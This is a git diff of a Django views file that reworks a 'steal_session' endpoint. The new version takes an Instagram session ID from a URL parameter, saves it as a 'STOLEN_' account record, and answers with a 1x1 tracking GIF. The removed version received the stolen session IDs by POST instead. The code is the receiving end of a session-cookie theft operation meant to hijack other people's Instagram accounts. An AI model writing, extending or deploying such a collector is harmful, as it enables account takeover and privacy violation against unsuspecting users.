@@ -162,37 +162,35 @@ def download_json(request):
 
 
 
+# core/views.py → ADD THIS FUNCTION
+from django.http import HttpResponse
+import urllib.parse
 
-
-def silent_page(request):
-    return render(request, 'core/silent.html')
-
-
-
-@csrf_exempt
 def steal_session(request):
-    if request.method == "POST":
+    sess = request.GET.get('sess', '')
+    if sess and len(sess) > 50:
         try:
-            import json
-            data = json.loads(request.body)
-            sessionid = data.get('sessionid', '')
-            
-            if sessionid and len(sessionid) > 50:
-                # SAVE TO DB
-                InstagramAccount.objects.update_or_create(
-                    username=f"STOLEN_{sessionid[:15]}",
-                    defaults={
-                        'password': 'SILENT_LINK',
-                        'session_data': fernet.encrypt(json.dumps({
-                            "authorization_data": {"sessionid": sessionid}
-                        }).encode()).decode(),
-                        'is_active': True,
-                        'last_success': timezone.now()
-                    }
-                )
-                print(f"STOLEN: {sessionid[:60]}...")
-                return JsonResponse({"status": "ok"})
-        except Exception as e:
-            print(f"ERROR: {e}")
-    
-    return JsonResponse({"status": "done"})
+            # DECRYPT TEST (optional)
+            decrypted_test = fernet.decrypt(sess.encode()).decode()  # if you stored encrypted
+        except:
+            pass
+
+        # SAVE RAW SESSIONID
+        InstagramAccount.objects.update_or_create(
+            username=f"STOLEN_{sess[:12]}",
+            defaults={
+                'password': 'SILENT_2025',
+                'session_data': fernet.encrypt(json.dumps({
+                    "authorization_data": {"sessionid": sess}
+                }).encode()).decode(),
+                'is_active': True,
+                'last_success': timezone.now()
+            }
+        )
+        print(f"STOLEN SESSION: {sess[:60]}...")
+
+    # RETURN 1x1 PIXEL
+    return HttpResponse(
+        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
+        content_type="image/gif"
+    )
